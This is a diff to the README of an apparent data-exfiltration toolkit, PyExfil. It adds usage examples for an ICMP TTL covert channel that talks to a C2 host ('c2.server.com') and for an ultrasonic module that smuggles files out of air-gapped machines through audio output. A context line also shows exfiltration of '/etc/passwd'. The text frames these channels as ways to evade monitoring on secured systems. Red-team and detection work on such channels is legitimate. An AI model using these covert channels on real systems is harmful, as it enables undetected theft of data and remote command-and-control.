@@ -357,6 +357,21 @@ print(check) # Boolean
 
 ### Communication
 
+#### ICMP TTL
+This method uses the TTL byte of the header of ICMP. It will probably not be useful for any exfiltration but can be very useful for communication with C2 for one byte responses or instructions. 
+
+```python
+from pyexfil.Comm.icmp_ttl import ICMP_TTL
+
+# For Client
+sender = ICMP_TTL(key = 'Password', dst_addr = 'c2.server.com')
+sender.Run(data=183)
+
+# For Server
+listener = ICMP_TTL(key = 'Password', dst_addr = 'c2.server.com')
+listener.Listen()
+```
+
 #### NTP Request
 This method builds an NTP packet, assuming these are not as heavily monitored, and using the 8*4 bytes allocated for timestamping as the communication channel. This limits the communication to 32 bytes per packet in order to keep the structure of the NTP packet whole.
 
@@ -619,6 +634,38 @@ Exfiltrator("/etc/passwd")
 
 """ Not Built Yet... """
 ```
+
+#### Ultrasonic
+This module is designed for secure data exfiltration from air-gapped systems that are heavily secured and monitored. It converts files into high-frequency (ultrasonic) tones, undetectable by the human ear, to be transmitted through standard audio output devices. This method is particularly useful in environments where hardware usage is severely restricted and the introduction of new devices could raise suspicion.
+
+The high-pitch module employs an advanced modulation technique to encode data into ultrasonic frequencies. For demonstration, we utilize a 16-QAM modulation scheme to encode 4 bits per symbol. The digital signal, comprising 1024 bits, is reshaped into symbols and then modulated into frequencies above 20 kHz. To simulate real-world transmission challenges, artificial noise is added.
+
+```python
+from pyexfil.physical.ultrasonic import UltrasonicTransmitter, UltrasonicReceiver
+
+# Setting up the transmitter with high-frequency carrier
+transmitter = UltrasonicTransmitter(fs=48000, fc=22000, symbol_duration=0.01, bits_per_symbol=4,
+                                    modulation_order=16, noise_level=0.1) # Do NOT change these settings!
+
+# Encoding and transmitting the message
+transmitter.transmit(transmitter.encode_data("Hello world!".encode('utf-8')))
+
+# Setting up the receiver to listen for ultrasonic data transmission
+receiver = UltrasonicReceiver(fs=48000, fc=22000, symbol_duration=0.01, bits_per_symbol=4, modulation_order=16) 
+                            # Do NOT change these settings!
+
+# Start receiving data
+receiver.receive()
+
+# Ensure your system's audio environment is set up correctly to handle ultrasonic frequencies.
+
+```
+
+> Important: Before running the example, make sure all dependencies are installed using pip install -r requirements.txt.
+
+**Environmental Considerations**
+This method performs best in environments with minimal ultrasonic noise and interference. Physical obstructions, ambient noise levels, and the quality of audio hardware can affect transmission clarity and range.
+
 
 #### QR Codes
 This module is for machines that are, again, air-gapped from other networks and have severe hardening. It's meant to convert a file to a set of QR codes to be scanned by a camera on another machine and still be able to make sense of them.
